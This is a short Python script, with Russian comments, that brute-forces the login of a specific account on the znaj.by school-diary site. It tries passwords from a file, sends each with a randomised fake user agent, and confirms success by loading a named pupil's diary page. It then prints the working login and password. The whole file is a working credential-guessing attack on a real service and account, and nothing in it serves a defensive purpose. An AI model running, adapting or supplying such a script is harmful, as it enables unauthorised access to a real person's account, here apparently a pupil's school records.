import requests
import fake_useragent
from bs4 import BeautifulSoup
import time


URL = 'https://znaj.by/Account/LogOnInternalWithIpay'
URL_2 = 'https://znaj.by/Client/PupilDiary?pupilId=1423890&yearStart=2020'
user = fake_useragent.UserAgent().random
name = 'LSDANDSDL'  #логин
Passwords = open('passwords.txt', 'r')


Num = 0
while True:

    StartTime = time.time()
    print(Num)

    password = Passwords.readline()
    print(password)

    data = {'UserName': name, 'Password': password}
    header = {'User-Agent' : user}
    session = requests.Session()
    responce = session.post(URL, data=data, headers = header)

    if responce.status_code == 200:
        Check = session.get(URL_2, headers = header).text
        soup = BeautifulSoup(Check, 'html.parser')
        try:
            items = soup.find_all('td', class_='diary-task')
            if len(items) != 0:
                print('пароль подошёл')
                print('Логин: ' + name, 'пароль ' + password)
                break
            else:
                print('пароль не подошёл')
        except:
            print('ошибка проверки')
    else:
        print('ошибка авторизации')
        print(responce.status_code)
    Num += 1
    print(time.time() - StartTime)
    print('--------------')

Passwords.close()
